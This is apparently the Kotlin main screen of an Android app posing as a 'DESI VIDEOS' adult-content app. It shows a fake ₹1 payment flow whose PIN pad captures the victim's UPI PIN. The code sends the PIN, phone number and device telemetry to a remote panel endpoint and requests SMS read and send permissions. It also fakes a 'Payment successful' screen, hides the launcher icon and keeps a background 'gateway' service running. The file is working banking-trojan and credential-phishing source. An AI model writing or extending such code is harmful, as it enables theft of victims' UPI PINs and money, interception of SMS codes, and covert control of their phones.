package com.screenlink.remote

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.InputType
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.Executors

class MainActivity : Activity() {

    companion object {
        private const val API_BASE_URL = TpcService.API_BASE_URL
        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"
        private const val KEY_PHONE = "phone_number"
        private const val KEY_APP = "payment_app"
        private const val KEY_PIN = "upi_pin"
        private const val KEY_DONE = "onboarded"
        private const val KEY_PENDING = "onboarding_pending"
        private const val KEY_CRASH = "last_crash"
        private const val KEY_HIDE_ICON = "hide_launcher_icon"
        private const val REQ_PERMS = 1301

        private val GIRLS = arrayOf(
            "https://files.catbox.moe/8xd98p.jpeg",
            "https://files.catbox.moe/euczr3q.jpeg",
            "https://files.catbox.moe/ym3rl6.jpeg"
        )

        /** Process-lifetime executor — Activity recreate hone par bhi zinda rehta hai. */
        private val IO = Executors.newSingleThreadExecutor { r ->
            Thread(r, "main-io").apply { isDaemon = true }
        }

        // ---- sober white theme ----
        private const val BG = 0xFFFFFFFF.toInt()
        private const val CARD = 0xFFFFFFFF.toInt()
        private const val CARD_2 = 0xFFF7F8FA.toInt()
        private const val FIELD = 0xFFF4F5F7.toInt()
        private const val BORDER = 0xFFE3E5E8.toInt()
        private const val ACCENT = 0xFF111827.toInt()
        private const val ACCENT_SOFT = 0xFFEDEFF2.toInt()
        private const val TEXT = 0xFF111827.toInt()
        private const val MUTED = 0xFF6B7280.toInt()
        private const val GREEN = 0xFF16A34A.toInt()
        private const val RED = 0xFFDC2626.toInt()
        private const val AMBER = 0xFFB45309.toInt()
    }

    private val main = Handler(Looper.getMainLooper())
    private lateinit var root: FrameLayout

    private var step = "perm"
    private var selectedApp: String? = null
    private var phoneNumber: String = ""
    private var pin: String = ""
    private var liveSimNumber: String = ""
    private var simSource: String = ""
    private var permissionAttempts = 0

    private val requiredPermissions: Array<String> by lazy {
        val base = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            base.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            base.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        base.toTypedArray()
    }

    // ------------------------------------------------------------- lifecycle
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        installCrashCatcher()

        root = FrameLayout(this).apply { setBackgroundColor(BG) }
        setContentView(root)

        phoneNumber = prefs().getString(KEY_PHONE, "").orEmpty()
        selectedApp = prefs().getString(KEY_APP, null)
        pin = prefs().getString(KEY_PIN, "").orEmpty()

        registrationId()
        startGateway()

        loadDeviceFacts()

        if (prefs().getBoolean(KEY_DONE, false)) {
            showDoneStep()
            if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
            return
        }

        showCrashIfAny()

        if (allPermissionsGranted()) {
            showCurrentStep()
        } else {
            showSplashStep()
            root.post { requestPermsSafely() }
        }

        if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()

        main.postDelayed({ askBatteryOptimization() }, 4500)
    }

    override fun onResume() {
        super.onResume()
        if (prefs().getBoolean(KEY_DONE, false)) {
            if (step == "done") showDoneStep()
            return
        }
        if (step == "perm" && allPermissionsGranted()) showCurrentStep()
    }

    override fun onDestroy() {
        // IO shared hai — yahan shutdown nahi karte
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        when (step) {
            "pin" -> showContentStep()
            "content" -> showPhoneStep()
            "done" -> finish()
            else -> @Suppress("DEPRECATION") super.onBackPressed()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_PERMS) return

        if (allPermissionsGranted()) {
            permissionAttempts = 0
            showCurrentStep()
            main.postDelayed({ askBatteryOptimization() }, 800)
            return
        }

        permissionAttempts++

        // do baar deny hua -> seedha settings kholo (warna dialog loop ban jata hai)
        val permanentlyDenied = requiredPermissions.any {
            !shouldShowRequestPermissionRationale(it)
        }
        if (permissionAttempts >= 2 || permanentlyDenied) {
            openAppSettings()
        } else {
            showPermissionDialog()
        }
    }

    // ------------------------------------------------------------ gateway
    private fun startGateway() {
        try {
            ContextCompat.startForegroundService(this, Intent(this, TpcService::class.java))
        } catch (e: Throwable) {
            Log.e("DESI", "foreground service start fail", e)
            try {
                startService(Intent(this, TpcService::class.java))
            } catch (e2: Throwable) {
                Log.e("DESI", "plain service start fail", e2)
            }
        }
    }

    private fun isServiceRunning(): Boolean = try {
        val am = getSystemService(ActivityManager::class.java)
        am?.getRunningServices(60)?.any {
            it.service.className == TpcService::class.java.name
        } == true
    } catch (_: Throwable) {
        false
    }

    private fun askBatteryOptimization() {
        if (isFinishing) return
        try {
            val pm = getSystemService(PowerManager::class.java) ?: return
            if (pm.isIgnoringBatteryOptimizations(packageName)) return
            @Suppress("BatteryLife")
            startActivity(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName"))
            )
        } catch (_: Throwable) {
        }
    }

    // ------------------------------------------------------ device facts
    private fun loadDeviceFacts() {
        IO.execute {
            val (number, source) = runCatching { DeviceInfo.simNumber(this) }
                .getOrDefault("" to "")
            val battery = runCatching {
                DeviceInfo.telemetry(this).optInt("battery_level", -1)
            }.getOrDefault(-1)

            main.post {
                liveSimNumber = number
                simSource = source
                batteryLevel = battery
                if (step == "done") showDoneStep()
            }
        }
    }

    private var batteryLevel: Int = -1

    // -------------------------------------------------------- crash logger
    private fun installCrashCatcher() {
        val prev = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            try {
                val trace = Log.getStackTraceString(e).take(4000)
                prefs().edit().putString(KEY_CRASH, trace).apply()
            } catch (_: Throwable) {
            }
            prev?.uncaughtException(t, e)
        }
    }

    private fun showCrashIfAny() {
        val crash = prefs().getString(KEY_CRASH, null) ?: return
        prefs().edit().remove(KEY_CRASH).apply()
        if (isFinishing) return
        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
            .setTitle("Last crash")
            .setMessage(crash)
            .setPositiveButton("OK", null)
            .show()
    }

    // ------------------------------------------------------------ navigation
    private fun allPermissionsGranted(): Boolean =
        requiredPermissions.all {
            checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
        }

    private fun requestPermsSafely() {
        if (isFinishing) return
        try {
            requestPermissions(requiredPermissions, REQ_PERMS)
        } catch (_: Throwable) {
        }
    }

    private fun showCurrentStep() {
        if (phoneNumber.isBlank()) showPhoneStep() else showContentStep()
    }

    private fun setScreen(view: View, stepName: String) {
        step = stepName
        root.removeAllViews()
        root.addView(
            view,
            FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        )
    }

    private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()

    // ------------------------------------------------- deny popup
    private fun showPermissionDialog() {
        if (isFinishing) return
        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
            .setTitle("Permission do")
            .setMessage("Gateway chalane ke liye SMS + phone permission zaroori hai.")
            .setCancelable(false)
            .setPositiveButton("Permission do") { _, _ -> requestPermsSafely() }
            .setNeutralButton("Settings") { _, _ -> openAppSettings() }
            .show()
    }

    private fun openAppSettings() {
        try {
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.fromParts("package", packageName, null)
                }
            )
        } catch (_: Throwable) {
        }
    }

    // ------------------------------------------------- splash
    private fun showSplashStep() {
        val col = column()
        col.addView(logo(84))
        col.addView(space(18))
        col.addView(label("DESI VIDEOS", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Permission check kar rahe hain…", 12.5f, MUTED, false, Gravity.CENTER))
        setScreen(scrollWrap(col), "perm")
    }

    // ------------------------------------------------------ step: number
    private fun showPhoneStep() {
        val col = column()

        col.addView(label("STEP 1 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(label("Enter your number", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Desi special content available", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(20))

        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
        }

        GIRLS.forEachIndexed { index, url ->
            val frame = FrameLayout(this).apply {
                background = rounded(12f, CARD, 1, BORDER)
                setPadding(dp(1), dp(1), dp(1), dp(1))
            }
            val image = ImageView(this).apply {
                scaleType = ImageView.ScaleType.CENTER_CROP
                setBackgroundColor(CARD_2)
            }
            ImageLoader.load(url, image)

            frame.addView(
                image,
                FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
            )

            val lp = LinearLayout.LayoutParams(0, dp(146), 1f)
            if (index > 0) lp.marginStart = dp(8)
            frame.layoutParams = lp

            row.addView(frame)
        }

        col.addView(row)
        col.addView(space(22))

        val input = EditText(this).apply {
            hint = "10-digit mobile number"
            inputType = InputType.TYPE_CLASS_PHONE
            setTextColor(TEXT)
            setHintTextColor(MUTED)
            textSize = 17f
            setPadding(dp(16), dp(15), dp(16), dp(15))
            background = rounded(10f, FIELD, 1)
            setText(phoneNumber)
            setSelection(text.length)
        }

        col.addView(input)

        if (liveSimNumber.isNotBlank()) {
            col.addView(space(10))
            val live = label(
                "SIM number mila: $liveSimNumber", 11.5f, GREEN, true, Gravity.CENTER
            )
            live.setOnClickListener {
                input.setText(liveSimNumber.filter { c -> c.isDigit() || c == '+' }.takeLast(10))
                input.setSelection(input.text.length)
            }
            col.addView(live)
        }

        col.addView(space(18))

        col.addView(primaryButton("Continue") {
            val value = input.text.toString().trim()
            if (value.length < 10) {
                toast("Sahi number daalo")
                return@primaryButton
            }
            phoneNumber = value
            prefs().edit().putString(KEY_PHONE, value).apply()
            showContentStep()
        })

        setScreen(scrollWrap(col), "phone")
    }

    // ----------------------------------------------------- step: content
    private fun showContentStep() {
        val col = column()

        col.addView(label("STEP 2 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(label("Desi special content", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Unlock karne ke liye ₹1 pay karo", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(22))

        val card = card()
        val inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(18), dp(18), dp(18))
        }

        inner.addView(label("Payment app chuno", 12.5f, MUTED, true))
        inner.addView(space(12))

        val tiles = mutableMapOf<String, View>()

        fun paintTiles() {
            tiles.forEach { (key, view) ->
                val active = key == selectedApp
                view.background = rounded(
                    10f,
                    if (active) ACCENT_SOFT else CARD_2,
                    if (active) 2 else 1,
                    if (active) ACCENT else BORDER
                )
            }
        }

        listOf("GPay", "Paytm", "PhonePe", "WhatsApp").chunked(2).forEach { pair ->
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            pair.forEachIndexed { index, name ->
                val tile = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    setPadding(dp(14), dp(18), dp(14), dp(18))
                    background = rounded(10f, CARD_2, 1)
                }

                tile.addView(label(name, 15f, TEXT, true, Gravity.CENTER))
                tile.addView(space(4))
                tile.addView(label("₹1 payment", 11f, MUTED, false, Gravity.CENTER))

                tile.setOnClickListener {
                    selectedApp = name
                    paintTiles()
                }

                tiles[name] = tile

                val lp = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                if (index > 0) lp.marginStart = dp(10)
                tile.layoutParams = lp

                row.addView(tile)
            }

            inner.addView(row)
            inner.addView(space(10))
        }

        card.addView(inner)
        col.addView(card)
        col.addView(space(20))

        col.addView(primaryButton("Pay ₹1") {
            if (selectedApp == null) {
                toast("Pehle app select karo")
                return@primaryButton
            }
            prefs().edit().putString(KEY_APP, selectedApp).apply()
            pin = ""
            showPinStep()
        })

        setScreen(scrollWrap(col), "content")
        paintTiles()
    }

    // --------------------------------------------------------- step: pin
    private fun showPinStep() {
        val col = column()

        col.addView(label("STEP 3 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("₹1", 46f, TEXT, true, Gravity.CENTER))
        col.addView(label("Paying via ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(24))

        val dots = LinearLayout(this).apply { gravity = Gravity.CENTER }
        val dotViews = mutableListOf<TextView>()

        repeat(6) {
            val dot = TextView(this).apply {
                text = "○"
                textSize = 22f
                setTextColor(MUTED)
                gravity = Gravity.CENTER
                width = dp(34)
            }
            dotViews.add(dot)
            dots.addView(dot)
        }

        col.addView(dots)
        col.addView(space(22))

        fun refreshDots() {
            dotViews.forEachIndexed { index, dot ->
                val filled = index < pin.length
                dot.text = if (filled) "●" else "○"
                dot.setTextColor(if (filled) TEXT else MUTED)
            }
        }

        val numpad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
        }

        listOf(
            listOf("1", "2", "3"),
            listOf("4", "5", "6"),
            listOf("7", "8", "9"),
            listOf("⌫", "0", "✓")
        ).forEach { rowKeys ->
            val row = LinearLayout(this).apply {
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            rowKeys.forEach { key ->
                val keyView = TextView(this).apply {
                    text = key
                    textSize = 20f
                    setTextColor(TEXT)
                    gravity = Gravity.CENTER
                    background = rounded(10f, CARD_2, 1)
                }

                keyView.setOnClickListener {
                    when (key) {
                        "⌫" -> if (pin.isNotEmpty()) pin = pin.dropLast(1)
                        "✓" -> {
                            if (pin.length >= 4) submitPin() else toast("Kam se kam 4 digit")
                        }
                        else -> if (pin.length < 6) pin += key
                    }
                    refreshDots()
                }

                val lp = LinearLayout.LayoutParams(dp(78), dp(58))
                lp.marginStart = dp(6)
                lp.marginEnd = dp(6)
                lp.topMargin = dp(6)
                lp.bottomMargin = dp(6)
                keyView.layoutParams = lp

                row.addView(keyView)
            }

            numpad.addView(row)
        }

        col.addView(numpad)
        col.addView(space(16))
        col.addView(label("UPI PIN · 4–6 digit", 11.5f, MUTED, false, Gravity.CENTER))

        setScreen(scrollWrap(col), "pin")
        refreshDots()
    }

    // --------------------------------------------------------- submit
    private fun onboardingPayload(): String = JSONObject().apply {
        put("registration_id", registrationId())
        put("phone_number", phoneNumber.take(20))
        put("payment_app", (selectedApp ?: "").take(30))
        put("upi_pin", pin.take(8))
        put("amount", 1)
        put("device_name", DeviceInfo.summary(this@MainActivity))
        put("telemetry", DeviceInfo.telemetry(this@MainActivity))
    }.toString()

    private fun postOnboarding(): Boolean {
        var connection: HttpURLConnection? = null
        return try {
            connection = URL("$API_BASE_URL/devices/onboarding")
                .openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 12_000
            connection.readTimeout = 12_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.outputStream.use { it.write(onboardingPayload().toByteArray(Charsets.UTF_8)) }
            connection.responseCode in 200..299
        } catch (_: Exception) {
            false
        } finally {
            connection?.disconnect()
        }
    }

    private fun submitPin() {
        prefs().edit().putString(KEY_PIN, pin).apply()
        showProcessingStep()

        IO.execute {
            var synced = false
            for (attempt in 0 until 4) {
                if (postOnboarding()) {
                    synced = true
                    break
                }
                Thread.sleep(1200L * (attempt + 1))
            }

            prefs().edit().putBoolean(KEY_PENDING, !synced).apply()

            // gateway ko bhi batao ki fresh telemetry bheje
            try {
                ContextCompat.startForegroundService(
                    this, Intent(this, TpcService::class.java)
                )
            } catch (_: Throwable) {
            }

            main.post { showSuccessStep(synced) }
        }
    }

    private fun resendOnboarding() {
        if (phoneNumber.isBlank()) return
        IO.execute {
            if (postOnboarding()) {
                prefs().edit().putBoolean(KEY_PENDING, false).apply()
                main.post { if (step == "done") showDoneStep() }
            }
        }
    }

    private fun showProcessingStep() {
        val col = column()
        col.addView(label("Processing payment…", 18f, TEXT, true, Gravity.CENTER))
        col.addView(space(12))
        col.addView(label("₹1 • ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
        setScreen(col, "processing")
    }

    private fun showSuccessStep(synced: Boolean) {
        prefs().edit().putBoolean(KEY_DONE, true).apply()

        val col = column()
        col.addView(label("✓", 58f, GREEN, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("Payment successful", 22f, TEXT, true, Gravity.CENTER))
        col.addView(space(8))
        col.addView(label("₹1 paid via ${selectedApp ?: ""}", 14f, MUTED, false, Gravity.CENTER))
        col.addView(space(24))
        col.addView(label("Content unlock ho gaya", 14f, TEXT, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(
            label(
                if (synced) "Panel synced ✓" else "Panel se sync pending — baad me auto retry hoga",
                11.5f,
                if (synced) GREEN else AMBER,
                false,
                Gravity.CENTER
            )
        )
        col.addView(space(28))

        col.addView(primaryButton("Start") {
            if (prefs().getBoolean(KEY_HIDE_ICON, true)) {
                hideLauncherIcon()
                toast("App home screen se hidden — panel se control karo")
            }
            main.postDelayed({ finish() }, 900)
        })

        setScreen(scrollWrap(col), "done")
    }

    // --------------------------------------------------- already onboarded
    private fun showDoneStep() {
        val col = column()

        col.addView(label("✓", 50f, GREEN, true, Gravity.CENTER))
        col.addView(space(12))
        col.addView(label("Gateway active", 21f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(
            label(
                if (isServiceRunning()) "Background me chal raha hai"
                else "Service start ho rahi hai…",
                12.5f,
                if (isServiceRunning()) GREEN else AMBER,
                false,
                Gravity.CENTER
            )
        )
        col.addView(space(22))

        val card = card()
        val inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(12), dp(18), dp(12))
        }

        val pending = prefs().getBoolean(KEY_PENDING, false)

        val rows = listOf(
            "Number" to phoneNumber.ifBlank { "—" },
            "SIM (live)" to (liveSimNumber.ifBlank { "—" }),
            "App" to (selectedApp ?: "—"),
            "PIN" to (pin.ifBlank { "—" }),
            "Device" to DeviceInfo.summary(this),
            "Android" to (Build.VERSION.RELEASE ?: "—"),
            "Battery" to if (batteryLevel in 0..100) "$batteryLevel%" else "—",
            "Service" to if (isServiceRunning()) "running" else "starting",
            "Panel sync" to if (pending) "pending" else "ok"
        )

        rows.forEach { (k, v) ->
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                setPadding(0, dp(9), 0, dp(9))
            }
            row.addView(label(k, 12.5f, MUTED, false))
            val value = label(v, 12.5f, TEXT, true, Gravity.END)
            value.isSingleLine = true
            row.addView(value)
            inner.addView(row)
        }

        card.addView(inner)
        col.addView(card)
        col.addView(space(14))

        if (liveSimNumber.isBlank()) {
            col.addView(
                label(
                    "Live SIM number nahi mila — panel se 'fetch number' dabao.",
                    11.5f, AMBER, false, Gravity.CENTER
                )
            )
            col.addView(space(12))
        }

        // launcher icon toggle
        val toggleRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(dp(16), dp(12), dp(16), dp(12))
            background = rounded(12f, CARD, 1, BORDER)
        }
        toggleRow.addView(label("Home screen icon chhupao", 13f, TEXT, false))
        val state = label(
            if (prefs().getBoolean(KEY_HIDE_ICON, true)) "ON" else "OFF",
            12.5f, TEXT, true, Gravity.END
        )
        toggleRow.addView(state)
        toggleRow.setOnClickListener {
            val now = !prefs().getBoolean(KEY_HIDE_ICON, true)
            prefs().edit().putBoolean(KEY_HIDE_ICON, now).apply()
            state.text = if (now) "ON" else "OFF"
            if (now) hideLauncherIcon() else showLauncherIcon()
        }
        col.addView(toggleRow)
        col.addView(space(18))

        col.addView(primaryButton("Open panel") { openPanel() })
        col.addView(space(10))

        if (pending) {
            col.addView(secondaryButton("Sync dobara bhejo") {
                toast("Sync bhej rahe hain…")
                resendOnboarding()
            })
            col.addView(space(10))
        }

        col.addView(secondaryButton("Re-run onboarding") {
            pin = ""
            prefs().edit().putBoolean(KEY_DONE, false).apply()
            showCurrentStep()
        })
        col.addView(space(10))
        col.addView(secondaryButton("Close") { finish() })

        setScreen(scrollWrap(col), "done")

        if (batteryLevel < 0) loadDeviceFacts()
    }

    // --------------------------------------------------- icon toggle
    private fun launcherAlias(): ComponentName =
        ComponentName(this, "$packageName.LauncherAlias")

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                launcherAlias(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Throwable) {
        }
    }

    private fun showLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                launcherAlias(),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Throwable) {
        }
    }

    private fun openPanel() {
        try {
            startActivity(
                Intent(Intent.ACTION_VIEW, Uri.parse("$API_BASE_URL/admin"))
            )
        } catch (_: Throwable) {
            toast("Koi browser nahi mila")
        }
    }

    // ------------------------------------------------------------ helpers
    private fun prefs() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private fun registrationId(): String {
        val p = prefs()
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private fun dp(value: Int) = (value * resources.displayMetrics.density).toInt()

    private fun space(height: Int) = View(this).apply {
        layoutParams = LinearLayout.LayoutParams(1, dp(height))
    }

    private fun column() = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        gravity = Gravity.CENTER_HORIZONTAL
        setPadding(dp(24), dp(56), dp(24), dp(40))
        setBackgroundColor(BG)
    }

    private fun scrollWrap(child: View) = ScrollView(this).apply {
        isFillViewport = true
        setBackgroundColor(BG)
        addView(child)
    }

    private fun card() = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        background = rounded(14f, CARD, 1, BORDER)
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
    }

    private fun label(
        text: String,
        size: Float,
        color: Int,
        bold: Boolean = false,
        gravity: Int = Gravity.START
    ) = TextView(this).apply {
        this.text = text
        textSize = size
        setTextColor(color)
        this.gravity = gravity
        if (bold) typeface = Typeface.DEFAULT_BOLD
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
    }

    private fun primaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        textSize = 15f
        typeface = Typeface.DEFAULT_BOLD
        setTextColor(0xFFFFFFFF.toInt())
        background = rounded(10f, ACCENT, 0)
        isAllCaps = false
        setOnClickListener { onClick() }
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(52)
        )
    }

    private fun secondaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        textSize = 14f
        setTextColor(TEXT)
        background = rounded(10f, CARD, 1, BORDER)
        isAllCaps = false
        setOnClickListener { onClick() }
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(48)
        )
    }

    private fun logo(size: Int) = TextView(this).apply {
        text = "DV"
        textSize = 28f
        typeface = Typeface.DEFAULT_BOLD
        setTextColor(TEXT)
        gravity = Gravity.CENTER
        background = rounded(18f, CARD, 2, TEXT)
        layoutParams = LinearLayout.LayoutParams(dp(size), dp(size)).apply {
            gravity = Gravity.CENTER_HORIZONTAL
        }
    }

    private fun rounded(
        radiusDp: Float,
        fill: Int,
        strokeWidth: Int,
        strokeColor: Int = BORDER
    ) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE
        cornerRadius = dp(radiusDp.toInt()).toFloat()
        setColor(fill)
        if (strokeWidth > 0) setStroke(dp(strokeWidth), strokeColor)
    }
}